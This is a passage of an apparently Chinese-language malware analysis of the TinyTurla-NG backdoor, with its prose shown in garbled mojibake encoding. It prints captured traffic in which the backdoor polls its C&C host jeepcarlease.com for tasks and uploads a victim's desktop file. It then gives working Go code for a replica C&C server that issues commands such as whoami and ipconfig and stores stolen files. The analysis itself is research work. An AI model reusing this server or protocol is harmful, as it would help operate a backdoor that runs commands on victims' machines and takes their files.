User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Content-Length: 267
Host: jeepcarlease.com

---
Content-Disposition: form-data;name="id"
Content-Type: text/plain

307b5c9a
---
Content-Disposition: form-data;name="result"
Content-Type: text/plain

[+] ShortTimer and FailCounter changed. New ShortTimer is 1 minute & New FailCounter is 1
-----
....

#**********C&C ç«™ç‚¹ -> TinyTurla-NG æ–°åé—¨**********
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Mon, 26 Feb 2024 03:36:10 GMT
Content-Length: 4

rsp:
```

#### ä¸Šä¼ æ–‡ä»¶ã€ä¸‹è½½æ–‡ä»¶ç±»æŒ‡ä»¤

ä¸Šä¼ æ–‡ä»¶ã€ä¸‹è½½æ–‡ä»¶ç±»æŒ‡ä»¤çš„é€šä¿¡æ¨¡å‹æƒ…å†µå¦‚ä¸‹ï¼š

```plain
#**********TinyTurla-NG æ–°åé—¨ -> C&C ç«™ç‚¹**********
#å­—ç¬¦ä¸²å½¢å¼ï¼š
POST /wp-includes/blocks/rss.old.php HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary="-"
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Content-Length: 175
Host: jeepcarlease.com

---
Content-Disposition: form-data;name="id"
Content-Type: text/plain

307b5c9a
---
Content-Disposition: form-data;name="gettask"
Content-Type: text/plain

-----
.\
#**********C&C ç«™ç‚¹ -> TinyTurla-NG æ–°åé—¨**********
#å­—ç¬¦ä¸²å½¢å¼ï¼š
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Mon, 26 Feb 2024 03:36:36 GMT
Content-Length: 39

rsp:post C:\Users\admin\Desktop\111.txt
#**********TinyTurla-NG æ–°åé—¨ -> C&C ç«™ç‚¹**********
#å­—ç¬¦ä¸²å½¢å¼ï¼š
POST /wp-includes/blocks/rss.old.php HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary="-"
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Content-Length: 738
Host: jeepcarlease.com

---
Content-Disposition: form-data;name="id"
Content-Type: text/plain

307b5c9a
---
Content-Disposition: form-data;name="file"; filename="111.txt"; filename*=utf-8''111.txt
Content-Type: application/octet-stream

package main

import (
    "fmt"
    "os"
)

func main() {
    filePath := "test.txt"

    // ..............................................
    file, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
    if err != nil {
        fmt.Println("............:", err)
        return
    }
    defer file.Close()

    // ........
    content := "................\n"
    _, err = file.WriteString(content)
    if err != nil {
        fmt.Println("............:", err)
        return
    }

    fmt.Println("....................")
}
-----
#**********C&C ç«™ç‚¹ -> TinyTurla-NG æ–°åé—¨**********
#å­—ç¬¦ä¸²å½¢å¼ï¼š
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Mon, 26 Feb 2024 03:36:40 GMT
Content-Length: 4

rsp:
#**********TinyTurla-NG æ–°åé—¨ -> C&C ç«™ç‚¹**********
#å­—ç¬¦ä¸²å½¢å¼ï¼š
POST /wp-includes/blocks/rss.old.php HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary="-"
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Content-Length: 225
Host: jeepcarlease.com

---
Content-Disposition: form-data;name="id"
Content-Type: text/plain

307b5c9a
---
Content-Disposition: form-data;name="result"
Content-Type: text/plain

[+] File C:\Users\admin\Desktop\111.txt posted

-----
.
..
#**********C&C ç«™ç‚¹ -> TinyTurla-NG æ–°åé—¨**********
#å­—ç¬¦ä¸²å½¢å¼ï¼š
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Mon, 26 Feb 2024 03:36:42 GMT
Content-Length: 4

rsp:
```

## æ¨¡æ‹Ÿæ„å»º C&C ç«™ç‚¹

åœ¨ç¬”è€…æ¨¡æ‹Ÿæ„å»º TinyTurla-NG æ–°åé—¨ C&C ç«™ç‚¹çš„è¿‡ç¨‹ä¸­ï¼Œç¬”è€…æœ€åˆå‡†å¤‡å°è¯•ä½¿ç”¨è‡ªç­¾åè¯ä¹¦æ„å»ºä¸€ä¸ª HTTPS ç«™ç‚¹ï¼Œä½†åœ¨å®é™…æ„å»ºè¿‡ç¨‹ä¸­ï¼Œç¬”è€…å‘ç° TinyTurla-NG æ–°åé—¨ä»£ç ä¸­å¹¶æœªåƒ TinyTurla åé—¨è°ƒç”¨äº† WinHttpSetOption å‡½æ•°å¯¹è¯ä¹¦é”™è¯¯ä¿¡æ¯è¿›è¡Œå¿½ç•¥ï¼Œå› æ­¤ï¼ŒTinyTurla-NG æ–°åé—¨æ— æ³•æˆåŠŸè®¿é—®ä½¿ç”¨è‡ªç­¾åè¯ä¹¦æ„å»ºçš„ HTTPS ç«™ç‚¹ã€‚

é€šè¿‡å®é™…è®¿é—® TinyTurla-NG æ–°åé—¨çš„ C&C ç«™ç‚¹ï¼Œå‘ç°å…¶ C&C ç«™ç‚¹çš„è¯ä¹¦ä¿¡æ¯ç¡®å®æ˜¯æ­£å¸¸çš„è¯ä¹¦ä¿¡æ¯ï¼Œç›¸å…³æˆªå›¾å¦‚ä¸‹ï¼š

[![](assets/1709105912-3c34d468d6ff95341625dac354520434.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227083955-ba5c56d8-d508-1.png)

[![](assets/1709105912-cd7a1f07daf7865d42ffdf5b44183d31.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227084012-c4400e24-d508-1.png)

**ç”±äºç¬”è€…æ²¡æœ‰æœ‰æ•ˆè¯ä¹¦æ–‡ä»¶ï¼Œå› æ­¤ç¬”è€…åªèƒ½å°è¯•æ¨¡æ‹Ÿæ„å»ºä¸€ä¸ª HTTP ç«™ç‚¹ï¼ˆå°† TinyTurla-NG æ–°åé—¨æ–‡ä»¶ä¸­çš„å†…ç½® https å¤–è” URL ä¿®æ”¹ä¸º http å¤–è” URL å³å¯å®ç°å¯¹ HTTP ç«™ç‚¹çš„è®¿é—®ï¼‰ï¼Œè‹¥å¤§å®¶æ„Ÿå…´è¶£ä¸”æ‰‹å¤´æœ‰æœ‰æ•ˆè¯ä¹¦æ–‡ä»¶ï¼Œå¯ä»¥å°è¯•å°†ä»£ç ä¿®æ”¹ä¸º HTTPS ç«™ç‚¹ã€‚**

åœ¨è¿™é‡Œï¼Œç¬”è€…å°†ä½¿ç”¨ golang è¯­è¨€æ¨¡æ‹Ÿæ„å»º TinyTurla-NG æ–°åé—¨ C&C ç«™ç‚¹ï¼Œè¯¦ç»†æƒ…å†µå¦‚ä¸‹ï¼š

ä»£ç ç»“æ„å¦‚ä¸‹ï¼š

[![](assets/1709105912-55d692f5efa3ba0f0cdef9436684080f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240227084031-cfd28438-d508-1.png)

-   tasks.txt

```plain
rsp:timeout 1 1
rsp:ipconfig
rsp:calc.exe
rsp:dir C:\Users\admin\Desktop
rsp:post C:\Users\admin\Desktop\111.txt
rsp:whoami
```

-   main.go

```plain
package main

import (
    "awesomeProject3/common"
    "github.com/gin-gonic/gin"
    "os"
)

func main() {
    init_tasks()

    r := gin.Default()
    // è®¾ç½®GINæ¨¡å¼ä¸ºreleaseæ¨¡å¼
    gin.SetMode(gin.ReleaseMode)
    r.GET("/", common.HandleRoot)
    r.POST("/wp-includes/blocks/rss.old.php", common.Handle_POST)
    r.POST("/wordpress/wp-includes/rss.old.php", common.Handle_POST)
    r.Run(":80")
}

func init_tasks() {
    os.Remove("./conf/tmp.txt")
    common.WriteFile("./conf/tmp.txt", "0")
}
```

-   common.go

```plain
package common

import (
    "bufio"
    "fmt"
    "github.com/gin-gonic/gin"
    "io"
    "io/ioutil"
    "os"
    "strconv"
)

func HandleRoot(c *gin.Context) {
    c.String(200, "Hello, World!")
}

func Handle_POST(c *gin.Context) {
    str_id := c.PostForm("id")
    str_result := c.PostForm("result")
    file, header, _ := c.Request.FormFile("file")
    fmt.Println(str_id, str_result)
    if str_result != "" {
        WriteFile_A("./conf/"+str_id+".txt", "**********output********\r\n"+str_result+"\r\n")
        c.String(200, "rsp:")
    } else if header != nil {
        defer file.Close()
        // åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶
        out, _ := os.Create("./conf/post_" + header.Filename)
        defer out.Close()
        // å°†ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹æ‹·è´åˆ°æ–°æ–‡ä»¶ä¸­
        _, _ = io.Copy(out, file)
        c.String(200, "rsp:")
    } else if str_result == "" {
        str, _ := ReadFile("./conf/tmp.txt")
        num, _ := strconv.Atoi(str)
        strs := FileToSlice("./conf/tasks.txt")
        if num+1 < len(strs) {
            os.Remove("./conf/tmp.txt")
            WriteFile("./conf/tmp.txt", strconv.Itoa(num+1))
            c.String(200, strs[num])
        } else {
            c.String(200, "rsp:")
        }
    }
}

func FileToSlice(file string) []string {
    fil, _ := os.Open(file)
    defer fil.Close()
    var lines []string
    scanner := bufio.NewScanner(fil)
    for scanner.Scan() {
        lines = append(lines, scanner.Text())
    }
    return lines
}

// ReadFile is used to read a given file and return its data as a string.
func ReadFile(filename string) (string, error) {
    f, err := os.Open(filename)
    if err != nil {
        return "", err
    }
    defer f.Close()

    b, err := ioutil.ReadAll(f)
    if err != nil {
        return "", err
    }

    return string(b), nil
}

// WriteFile is used to write data into a given file.
func WriteFile(filename, data string) error {
    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    _, err = io.WriteString(file, data)
    if err != nil {
        return err
    }

    return nil
}

func checkFileIsExist(filename string) bool {
    var exist = true
    if _, err := os.Stat(filename); os.IsNotExist(err) {
        exist = false
    }
    return exist
}

func WriteFile_A(filename string, buffer string) {
    var f *os.File
    var err error

    if checkFileIsExist(filename) {
        f, err = os.OpenFile(filename, os.O_APPEND|os.O_WRONLY, os.ModeAppend)
    } else {
        f, err = os.Create(filename)
    }
    _, err = io.WriteString(f, buffer)
    if err != nil {
        fmt.Println(err.Error())
        return
    }
    f.Close()
}
```
